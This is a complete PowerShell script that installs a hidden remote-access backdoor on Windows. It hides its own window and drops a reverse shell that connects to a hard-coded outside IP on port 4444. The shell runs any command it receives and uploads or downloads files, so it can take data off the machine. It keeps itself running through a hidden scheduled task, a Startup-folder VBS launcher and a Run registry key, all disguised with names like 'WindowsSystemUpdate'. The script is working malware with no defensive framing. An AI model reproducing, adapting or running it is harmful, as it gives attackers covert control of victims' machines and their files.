# Error logging function
function Write-ErrorLog {
    param([string]$ErrorMessage)
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $errorFile = Join-Path $desktopPath "script_errors.txt"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] ERROR: $ErrorMessage"
    Add-Content -Path $errorFile -Value $logEntry
}

try {
    # Check if running as administrator
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-ErrorLog "This script requires Administrator privileges. Please run as Administrator."
        exit 1
    }

    # Completely hide PowerShell window
    try {
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        ' -ErrorAction SilentlyContinue
        
        $consolePtr = [Console.Window]::GetConsoleWindow()
        if ($consolePtr -ne [IntPtr]::Zero) {
            [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
        }
    } catch {
        Write-ErrorLog "Failed to hide window: $($_.Exception.Message)"
    }

    # Paths for persistence
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $programDataPath = "C:\ProgramData"
    $persistentPath = Join-Path $programDataPath "SystemShell.ps1"
    $vbsPath = Join-Path $startupPath "SystemRun.vbs"
    
    # Ensure ProgramData directory exists
    try {
        if (-not (Test-Path $programDataPath)) {
            New-Item -ItemType Directory -Path $programDataPath -Force | Out-Null
        }
    } catch {
        Write-ErrorLog "Failed to create directory: $($_.Exception.Message)"
    }

    # Create the persistent reverse shell script
    $reverseShellScript = @'
# Enhanced hidden reverse shell with error handling
try {
    # Hide window immediately
    try {
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        ' -ErrorAction SilentlyContinue
        $consolePtr = [Console.Window]::GetConsoleWindow()
        if ($consolePtr -ne [IntPtr]::Zero) {
            [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
        }
    } catch { }

    # TCP Connection parameters
    $ip = "143.110.191.171"
    $port = 4444
    $retryInterval = 10
    
    function Start-ReverseShell {
        while($true) {
            try {
                $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
                $stream = $client.GetStream()
                $reader = New-Object System.IO.StreamReader($stream)
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.AutoFlush = $true

                while($client.Connected) {
                    $writer.Write("PS " + (Get-Location).Path + "> ")
                    $command = $reader.ReadLine()
                    
                    if($command -eq "exit") { break }
                    if($command -eq "quit") { return }
                    
                    # Handle download command
                    if($command.StartsWith("download ")) {
                        $file = $command.Substring(9)
                        if(Test-Path $file) {
                            try {
                                $content = [System.IO.File]::ReadAllBytes($file)
                                $writer.Write("[DOWNLOAD]:" + [Convert]::ToBase64String($content) + "`n")
                            } catch {
                                $writer.Write("Error downloading file: " + $_.Exception.Message + "`n")
                            }
                        } else {
                            $writer.Write("File not found`n")
                        }
                        continue
                    }
                    
                    # Handle upload command
                    if($command.StartsWith("upload ")) {
                        $parts = $command.Split(' ', 3)
                        if($parts.Length -eq 3) {
                            try {
                                $filePath = $parts[1]
                                $fileContent = [Convert]::FromBase64String($parts[2])
                                [System.IO.File]::WriteAllBytes($filePath, $fileContent)
                                $writer.Write("File uploaded successfully`n")
                            } catch {
                                $writer.Write("Error uploading file: " + $_.Exception.Message + "`n")
                            }
                        }
                        continue
                    }
                    
                    # Execute regular command
                    try {
                        $output = Invoke-Expression -Command $command 2>&1 | Out-String
                        $writer.Write($output)
                    } catch {
                        $writer.Write("Error: " + $_.Exception.Message + "`n")
                    }
                }
                
                $reader.Close()
                $writer.Close()
                $stream.Close()
                $client.Close()
            } catch {
                Start-Sleep -Seconds $retryInterval
            }
        }
    }
    
    Start-ReverseShell
} catch {
    Start-Sleep -Seconds 30
    PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File "$persistentPath"
}
'@

    # Save persistent script
    try {
        Set-Content -Path $persistentPath -Value $reverseShellScript -Force -Encoding UTF8
    } catch {
        Write-ErrorLog "Failed to create persistent script: $($_.Exception.Message)"
        throw
    }

    # Method 1: Scheduled Task
    try {
        $taskName = "WindowsSystemUpdate"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        
        # Unregister if exists
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        
        # Register new task
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    } catch {
        Write-ErrorLog "Scheduled task creation failed: $($_.Exception.Message)"
    }

    # Method 2: Startup Folder
    try {
        $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$persistentPath""", 0, False
"@
        Set-Content -Path $vbsPath -Value $vbsContent -Force
    } catch {
        Write-ErrorLog "Startup entry creation failed: $($_.Exception.Message)"
    }

    # Method 3: Registry Run Key
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsSystemUpdate"
        $regValue = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
        
        if (Test-Path $regPath) {
            Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        }
    } catch {
        Write-ErrorLog "Registry entry creation failed: $($_.Exception.Message)"
    }

    # Start the reverse shell immediately
    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`"" -WindowStyle Hidden
    } catch {
        Write-ErrorLog "Failed to start reverse shell: $($_.Exception.Message)"
    }

} catch {
    Write-ErrorLog "Critical error in main script: $($_.Exception.Message)"
}

# Keep the script running briefly
Start-Sleep -Seconds 5
